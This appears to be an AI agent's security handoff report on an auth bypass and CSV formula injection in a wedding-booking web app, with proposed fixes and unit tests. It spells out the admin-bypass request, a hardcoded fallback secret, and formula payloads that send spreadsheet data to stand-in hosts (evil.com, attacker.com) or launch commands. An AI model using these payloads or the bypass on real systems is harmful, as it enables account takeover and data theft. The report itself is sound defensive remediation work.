# Handoff Report: Milestone 1 Security Investigation (SEC-01 & SEC-02)

**Agent Role**: Security Explorer & Codebase Investigator (SEC-01 & SEC-02)  
**Target Milestone**: Milestone 1 (Phase 1: Security)  
**Working Directory**: `c:\Projects\WeddingWithIndia\wedding-with-india\.agents\m1_explorer_sec`  
**Status**: COMPLETE  

---

## 1. Observation

Direct examination of the WeddingWithIndia codebase reveals the following exact file paths, line numbers, and verbatim code structures for SEC-01 and SEC-02:

### SEC-01: E2E Auth Bypass Vulnerability

#### A. `lib/test-auth.ts` (Lines 3–7)
```typescript
const E2E_SECRET = process.env.E2E_AUTH_SECRET || "e2e-secret-key-wedding-with-india-dev-test-only";

export function isE2ETestAuthEnabled(): boolean {
  return true;
}
```
- **Finding**: `isE2ETestAuthEnabled()` is hardcoded to return `true` unconditionally regardless of `process.env.NODE_ENV` or `process.env.PLAYWRIGHT_TEST`.
- **HMAC Fallback**: Uses a static, hardcoded fallback secret `"e2e-secret-key-wedding-with-india-dev-test-only"`.

#### B. `app/api/test/auth/route.ts` (Lines 7–40, 42–78)
```typescript
export async function GET(req: NextRequest) {
  if (!isE2ETestAuthEnabled()) {
    return NextResponse.json({ error: "Not found" }, { status: 404 });
  }

  const { searchParams } = new URL(req.url);
  const email = searchParams.get("email");
  const role = searchParams.get("role");
  const redirectUrl = searchParams.get("redirect") || "/dashboard";

  let user = null;
  if (email) {
    user = await prisma.user.findUnique({ where: { email } });
  } else if (role) {
    user = await prisma.user.findFirst({ where: { role: role as any } });
  }

  if (!user) {
    return NextResponse.json({ error: "User not found" }, { status: 404 });
  }

  const token = createE2ETestSessionToken(user.id, user.role, user.email);

  const response = NextResponse.redirect(new URL(redirectUrl, req.url));
  response.cookies.set("__wwi_e2e_session", token, {
    httpOnly: true,
    secure: false,
    sameSite: "lax",
    path: "/",
    maxAge: 24 * 60 * 60,
  });

  return response;
}
```
- **Finding**: Because `isE2ETestAuthEnabled()` returns `true`, an unauthenticated remote client can make a request to `GET /api/test/auth?role=ADMIN` or `POST /api/test/auth` on any live deployment. The route looks up the first user with `role === 'ADMIN'`, issues a valid HMAC-signed token, sets the `__wwi_e2e_session` cookie, and redirects to `/dashboard` with full administrative privileges.

#### C. `proxy.ts` (Lines 55–80)
```typescript
export async function proxy(req: NextRequest, event: NextFetchEvent) {
  // 1. E2E Testing Authenticated Session Handling (Local/Test environments ONLY)
  if (isE2ETestAuthEnabled()) {
    let e2eCookie = req.cookies.get("__wwi_e2e_session")?.value;
    if (!e2eCookie) {
      const cookieHeader = req.headers.get("cookie") || "";
      const match = cookieHeader.match(/__wwi_e2e_session=([^;]+)/);
      if (match) {
        e2eCookie = match[1];
      }
    }
    if (e2eCookie) {
      const session = verifyE2ETestSessionToken(e2eCookie);
      if (session) {
        if (isAdminRoute(req) && session.role !== "ADMIN") {
          const pathname = req.nextUrl?.pathname || new URL(req.url).pathname;
          if (pathname.startsWith("/api/")) {
            return NextResponse.json({ error: "FORBIDDEN: Admin role required." }, { status: 403 });
          }
          return NextResponse.redirect(new URL("/dashboard", req.url));
        }
        // Session is verified and authorized for route - proceed directly
        return NextResponse.next();
      }
    }
  }
  // 2. Invoke Clerk Middleware...
```
- **Finding**: The Next.js Edge proxy middleware inspects `isE2ETestAuthEnabled()`. Since it is `true`, any incoming request bearing a valid `__wwi_e2e_session` cookie bypasses Clerk authentication entirely and is granted access to all protected and admin routes.

#### D. `lib/auth.ts` (Lines 28–32, 157–161, 191–194)
```typescript
async function getE2ETestDbUser() {
  if (!isE2ETestAuthEnabled()) {
    console.log("[E2E AUTH] isE2ETestAuthEnabled is FALSE (PLAYWRIGHT_TEST:", process.env.PLAYWRIGHT_TEST, "NODE_ENV:", process.env.NODE_ENV, ")");
    return null;
  }
  try {
    const { cookies } = await import("next/headers");
    const cookieStore = await cookies();
    const e2eToken = cookieStore.get("__wwi_e2e_session")?.value;
    // ... verifies token and resolves or auto-provisions user in PostgreSQL
```
- **Finding**: Both `getDbUser()` and `syncAndGetDbUser()` invoke `getE2ETestDbUser()`. When `isE2ETestAuthEnabled()` is `true`, server actions and backend services treat the test cookie as an authenticated session.

---

### SEC-02: CSV Formula Injection Vulnerability

#### A. `app/api/reports/host/[weddingId]/route.ts` (Lines 38–52)
```typescript
const escapeCsv = (value: string | number) => `"${String(value).replace(/"/g, '""')}"`;
const header = "Booking ID,Primary Guest,Guests Count,Amount Paid,Status,Dietary Notes,Booking Date\n";
const rows = wedding.bookings
  .map((b) => {
    const guestName = b.traveler.fullName;
    const count = b.guestsCount;
    const amount = b.totalAmount;
    const status = b.status;
    const notes = b.traveler.foodPreferences || "None";
    const date = new Date(b.createdAt).toISOString().split("T")[0];
    return [b.id, guestName, count, amount, status, notes, date].map(escapeCsv).join(",");
  })
  .join("\n");

const csvContent = header + rows;
```
- **Finding**: `escapeCsv` only performs standard RFC 4180 double-quote escaping (`"` -> `""`). It contains zero sanitization for spreadsheet formula trigger characters (`=`, `+`, `-`, `@`, `\t`, `\r`).
- **Impact**: If a user supplies a name, dietary note, or address containing formula prefixes (e.g. `=HYPERLINK("https://evil.com/steal?data="&A1, "Click")` or `@SUM(1+1)*cmd|' /C calc'!A0` or `+91 98765 43210`), opening the exported CSV in Microsoft Excel, Apple Numbers, Google Sheets, or LibreOffice Calc triggers formula execution or severe parsing corruption (CWE-1236).

#### B. `lib/actions/admin.ts` (Lines 1170–1176)
```typescript
const header = "Booking ID,Traveler Name,Wedding,Date,Guests,Amount,Status\n";
const rows = bookings
  .map(
    (b) =>
      `"${b.id}","${b.traveler.fullName}","${b.wedding.title}","${b.date.toISOString().split("T")[0]}",${b.guestsCount},${b.totalAmount},"${b.status}"`
  )
  .join("\n");
```
- **Finding**: Admin booking CSV export also concatenates string fields directly inside quotes without formula neutralization.

---

## 2. Logic Chain

### SEC-01 Logic Chain
1. **Observation**: `lib/test-auth.ts` lines 5–7 define `isE2ETestAuthEnabled()` returning constant `true`.
2. **Implication**: Any deployment (development, staging, or production) has test authentication active.
3. **Attack Vector**: An external attacker sends `GET https://target/api/test/auth?role=ADMIN`.
4. **Execution**: The handler in `app/api/test/auth/route.ts` executes `prisma.user.findFirst({ where: { role: 'ADMIN' } })`, crafts an HMAC-signed token using the static fallback key, and attaches `__wwi_e2e_session` cookie to the HTTP response.
5. **Session Takeover**: Upon subsequent requests, `proxy.ts` line 57 checks `isE2ETestAuthEnabled()`, validates the attacker's cookie via `verifyE2ETestSessionToken()`, and calls `NextResponse.next()`, bypassing all Clerk middleware and granting full access to `/dashboard/admin/*` and `/api/admin/*`.
6. **Backend Compromise**: Server Actions calling `requireAuth()` or `requireRole([UserRole.ADMIN])` call `syncAndGetDbUser()`, which loads the admin user record from `getE2ETestDbUser()`.
7. **Remediation Logic**:
   - Gating `isE2ETestAuthEnabled()` strictly to:
     ```typescript
     export function isE2ETestAuthEnabled(): boolean {
       return process.env.NODE_ENV === "test" && process.env.PLAYWRIGHT_TEST === "true";
     }
     ```
   - In production (`process.env.NODE_ENV === "production"` and `process.env.PLAYWRIGHT_TEST` undefined):
     - `isE2ETestAuthEnabled()` strictly evaluates to `false`.
     - `app/api/test/auth/route.ts` immediately returns `{ error: "Not found" }` with HTTP 404.
     - `proxy.ts` completely skips the E2E cookie check block and invokes standard Clerk middleware.
     - `lib/auth.ts` `getE2ETestDbUser()` immediately returns `null`.
   - In automated test environments (Playwright and Jest test runners setting both flags):
     - `isE2ETestAuthEnabled()` evaluates to `true`, preserving full test suite compatibility without regression.

### SEC-02 Logic Chain
1. **Observation**: `app/api/reports/host/[weddingId]/route.ts` exports user-submitted values (`b.traveler.fullName`, `b.traveler.foodPreferences`, etc.) into a CSV stream via `escapeCsv`.
2. **Spreadsheet Behavior (CWE-1236)**: Modern spreadsheet software (Excel, Calc, Sheets) automatically treats any cell whose first character is `=`, `+`, `-`, `@`, `\t` (tab), or `\r` (carriage return) as an active formula or command macro.
3. **Exploitation**: An attacker registering as a traveler can set their food preference or name to `=HYPERLINK("https://attacker.com/leak?leak="&A2, "Dietary Alert")`. When the host downloads `Guest_Register_[slug].csv` and opens it, the spreadsheet software executes the formula and exfiltrates guest booking IDs, dates, and amounts to the attacker's server.
4. **Remediation Logic**:
   - According to OWASP CSV Injection Guidelines, spreadsheet formula characters at the start of a cell must be prefixed with a single quotation mark (`'`).
   - When Excel/Sheets encounters a leading `'`, it treats the entire cell value as literal string text and does not execute the formula.
   - The escaping algorithm must inspect both the raw string and trimmed string (`str.trimStart()`) to prevent leading-whitespace evasion (`" =1+1"` or `"\t@SUM"`).
   - The escaped string is then wrapped in standard RFC 4180 double quotes, with existing double quotes escaped as `""`.

---

## 3. Caveats

1. **Playwright Environment Configuration**:
   - For Playwright tests to utilize E2E test auth, `playwright.config.ts` must set `NODE_ENV: "test"` and `PLAYWRIGHT_TEST: "true"` in `webServer.env` and runner process env.
   - Currently, `playwright.config.ts` sets `NODE_ENV = "production"` on line 36 & 64. When updating `isE2ETestAuthEnabled()`, `playwright.config.ts` must ensure `NODE_ENV: "test"` is passed when starting the Next.js test server instance.
2. **Co-existence with UX-01 (Dietary Allergen Pipeline)**:
   - Milestone 1 UX-01 will expand `app/api/reports/host/[weddingId]/route.ts` to include `TravelDetail.dietaryRequirements` and `BookingGuest` dietary alerts.
   - The proposed `escapeCsv` implementation is designed to accept `unknown` (strings, numbers, null, undefined) and is fully compatible with both the current and UX-01 expanded schemas.
3. **No Other Unneutralized CSV Endpoints**:
   - A global search confirmed that only `app/api/reports/host/[weddingId]/route.ts` and `lib/actions/admin.ts` perform CSV compilation in the project.

---

## 4. Conclusion & Concrete Remediation Recommendations

### Concrete Code Changes

#### 1. SEC-01: Update `lib/test-auth.ts`
**Target File**: `c:\Projects\WeddingWithIndia\wedding-with-india\lib\test-auth.ts`  
**Lines 5–7**:
```typescript
// BEFORE:
export function isE2ETestAuthEnabled(): boolean {
  return true;
}

// AFTER:
export function isE2ETestAuthEnabled(): boolean {
  return process.env.NODE_ENV === "test" && process.env.PLAYWRIGHT_TEST === "true";
}
```

#### 2. SEC-01: Ensure `playwright.config.ts` Environment Alignment
**Target File**: `c:\Projects\WeddingWithIndia\wedding-with-india\playwright.config.ts`  
**Lines 36–37 & 64–65**:
```typescript
// BEFORE:
(process.env as Record<string, string>).NODE_ENV = process.env.NODE_ENV || "production";
process.env.PLAYWRIGHT_TEST = "true";
// ...
webServer: {
  // ...
  env: {
    ...process.env,
    NODE_ENV: "production",
    PLAYWRIGHT_TEST: "true",
    // ...
  }
}

// AFTER:
(process.env as Record<string, string>).NODE_ENV = process.env.NODE_ENV || "test";
process.env.PLAYWRIGHT_TEST = "true";
// ...
webServer: {
  // ...
  env: {
    ...process.env,
    NODE_ENV: "test",
    PLAYWRIGHT_TEST: "true",
    // ...
  }
}
```

#### 3. SEC-02: Update `escapeCsv` in `app/api/reports/host/[weddingId]/route.ts`
**Target File**: `c:\Projects\WeddingWithIndia\wedding-with-india\app\api\reports\host\[weddingId]\route.ts`  
**Replace line 38 with**:
```typescript
/**
 * Safely escapes and formats a cell value for RFC 4180 CSV output while neutralizing spreadsheet formula injection (CWE-1236).
 * Prepends a single quote "'" to values starting with '=', '+', '-', '@', '\t', or '\r' (even after leading whitespace).
 */
export function escapeCsv(value: unknown): string {
  if (value === null || value === undefined) {
    return '""';
  }
  let str = String(value);

  // SEC-02: Neutralize spreadsheet formula prefix characters (=, +, -, @, \t, \r)
  const trimmed = str.trimStart();
  const dangerousChars = ["=", "+", "-", "@", "\t", "\r"];
  if (
    dangerousChars.some((ch) => str.startsWith(ch)) ||
    (trimmed.length > 0 && dangerousChars.some((ch) => trimmed.startsWith(ch)))
  ) {
    str = `'${str}`;
  }

  return `"${str.replace(/"/g, '""')}"`;
}
```

#### 4. SEC-02 (Defense-in-Depth): Update `lib/actions/admin.ts`
**Target File**: `c:\Projects\WeddingWithIndia\wedding-with-india\lib\actions\admin.ts`  
Apply `escapeCsv` to all fields in `adminExportBookingsCSVAction()`:
```typescript
const rows = bookings
  .map(
    (b) =>
      [
        b.id,
        b.traveler.fullName,
        b.wedding.title,
        b.date.toISOString().split("T")[0],
        b.guestsCount,
        b.totalAmount,
        b.status,
      ]
        .map(escapeCsv)
        .join(",")
  )
  .join("\n");
```

---

## 5. Verification Method

### Step 1: Unit & Regression Verification of SEC-01
Create/run a dedicated test verifying `isE2ETestAuthEnabled()` behavior across environments:

```typescript
// Test Logic:
describe("SEC-01: E2E Auth Bypass Isolation", () => {
  const originalEnv = process.env.NODE_ENV;
  const originalPlaywright = process.env.PLAYWRIGHT_TEST;

  afterEach(() => {
    process.env.NODE_ENV = originalEnv;
    if (originalPlaywright !== undefined) {
      process.env.PLAYWRIGHT_TEST = originalPlaywright;
    } else {
      delete process.env.PLAYWRIGHT_TEST;
    }
  });

  it("strictly disables E2E test auth in production", () => {
    process.env.NODE_ENV = "production";
    delete process.env.PLAYWRIGHT_TEST;
    expect(isE2ETestAuthEnabled()).toBe(false);
  });

  it("strictly disables E2E test auth in production even if PLAYWRIGHT_TEST is true", () => {
    process.env.NODE_ENV = "production";
    process.env.PLAYWRIGHT_TEST = "true";
    expect(isE2ETestAuthEnabled()).toBe(false);
  });

  it("enables E2E test auth only when NODE_ENV is test and PLAYWRIGHT_TEST is true", () => {
    process.env.NODE_ENV = "test";
    process.env.PLAYWRIGHT_TEST = "true";
    expect(isE2ETestAuthEnabled()).toBe(true);
  });
});
```

### Step 2: Unit & Regression Verification of SEC-02
Create/run a unit test verifying `escapeCsv` formula neutralization:

```typescript
describe("SEC-02: CSV Formula Injection Neutralization", () => {
  it.each([
    ["=SUM(A1:A10)", "\"'=SUM(A1:A10)\""],
    ["+919876543210", "\"'+919876543210\""],
    ["-10% Discount", "\"'-10% Discount\""],
    ["@mention", "\"'@mention\""],
    ["\t=cmd|' /C calc'!A0", "\"'\t=cmd|' /C calc'!A0\""],
    ["\r=1+1", "\"'\r=1+1\""],
    ["   =HYPERLINK()", "\"'   =HYPERLINK()\""],
    ['Hello "World"', '"Hello ""World"""'],
    [150, '"150"'],
    [null, '""'],
    [undefined, '""'],
  ])("correctly sanitizes %s -> %s", (input, expected) => {
    expect(escapeCsv(input)).toBe(expected);
  });
});
```

### Step 3: Quad-Verification Commands
Run the standard project test suite:
1. `npx jest __tests__/lib/proxy-auth.test.ts` (Proxy authentication unit tests)
2. `npx jest` (All unit and integration test suites)
3. `npx tsc --noEmit` (TypeScript type check)
4. `npm run build` (Next.js production build)

### Invalidation Conditions
- Any occurrence where `isE2ETestAuthEnabled()` returns `true` when `process.env.NODE_ENV === "production"`.
- Any output from `escapeCsv` where a cell starting with `=`, `+`, `-`, `@`, `\t`, or `\r` is NOT prefixed by a single quote `'`.
